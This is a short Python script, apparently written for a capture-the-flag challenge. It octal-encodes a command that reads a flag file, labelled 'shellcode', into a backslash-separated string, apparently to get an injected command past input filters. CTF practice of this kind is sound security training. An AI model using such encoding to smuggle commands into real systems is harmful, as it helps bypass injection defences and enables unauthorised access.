#shellcode= cat flag_1s_here/flag_831b69012c67b35f.php
str1 = "cat flag_1s_here/flag_831b69012c67b35f.php"
arr=[]
for i in str1:
    r = oct(ord(i))
    r = str(r).replace("0o","")
    arr.append(r)
s = "\\"
p=s.join(arr)
print(p)